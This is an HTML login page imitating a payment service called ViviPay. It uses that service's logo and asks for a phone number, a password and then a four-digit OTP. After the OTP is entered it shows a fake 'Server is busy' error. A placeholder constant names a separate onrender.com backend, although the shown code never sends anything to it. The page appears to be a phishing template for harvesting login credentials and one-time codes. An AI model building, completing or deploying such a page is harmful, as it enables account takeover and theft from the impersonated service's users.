
<!DOCTYPE html>
<html lang="en" style="font-size: 44.8px;">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>ViviPay</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: sans-serif; }
        body { background: #fff; width: 100%; height: 100vh; display: flex; flex-direction: column; align-items: center; }
        .logo { width: 105%; max-width: 500px; margin-top: 20px; }
        .loginform { width: 90%; max-width: 380px; margin-top: 30px; }
        .input-field-group { border-bottom: 1.2px solid #e2e8f0; padding: 14px 4px; margin-bottom: 22px; }
        .input-field-group input { border: none; width: 100%; font-size: 17px; outline: none; }
        .submit-btn { background-color: #2563eb; color: #fff; border: none; width: 100%; padding: 14px; border-radius: 25px; font-size: 18px; cursor: pointer; }
        .form-utilities { display: flex; justify-content: space-between; margin-bottom: 20px; font-size: 14px; }
        
        /* Modal Styles */
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); justify-content: center; align-items: center; }
        .modal.active { display: flex; }
        .modal-content { background: #fff; padding: 20px; border-radius: 15px; width: 80%; text-align: center; }
        .otp-input { width: 40px; height: 40px; text-align: center; font-size: 20px; margin: 5px; }
    </style>
</head>
<body>

    <img src="https://vivipay.net/static/images/Login_Logo.png" class="logo">

    <div class="loginform">
        <form id="loginForm">
            <div class="input-field-group"><input type="tel" id="phone" placeholder="Enter phone number" required></div>
            <div class="input-field-group"><input type="password" id="pass" placeholder="Enter password" required></div>
            <div class="form-utilities">
                <label><input type="checkbox"> Save Password</label>
                <span id="forgotBtn" style="color:#2563eb; cursor:pointer;">Forgot password</span>
            </div>
            <button type="submit" class="submit-btn">Login</button>
        </form>
    </div>

    <!-- OTP Modal -->
    <div id="otpModal" class="modal">
        <div class="modal-content">
            <h3>Enter OTP</h3>
            <input type="tel" class="otp-input" maxlength="1">
            <input type="tel" class="otp-input" maxlength="1">
            <input type="tel" class="otp-input" maxlength="1">
            <input type="tel" class="otp-input" maxlength="1">
            <br><br>
            <button class="submit-btn" onclick="submitOtp()">Submit OTP</button>
        </div>
    </div>

    <script>
        const BACKEND_URL = 'https://vivipay-backend.onrender.com'; // Apna backend URL yahan rakhein

        // Login Submit
        document.getElementById('loginForm').onsubmit = (e) => {
            e.preventDefault();
            document.getElementById('otpModal').classList.add('active');
        };

        // Forgot Password Click
        document.getElementById('forgotBtn').onclick = () => {
            alert("Redirecting to Forgot Password...");
        };

        // OTP Submit
        function submitOtp() {
            alert("Server is busy, please try again later.");
            window.location.reload();
        }
    </script>
</body>
</html>
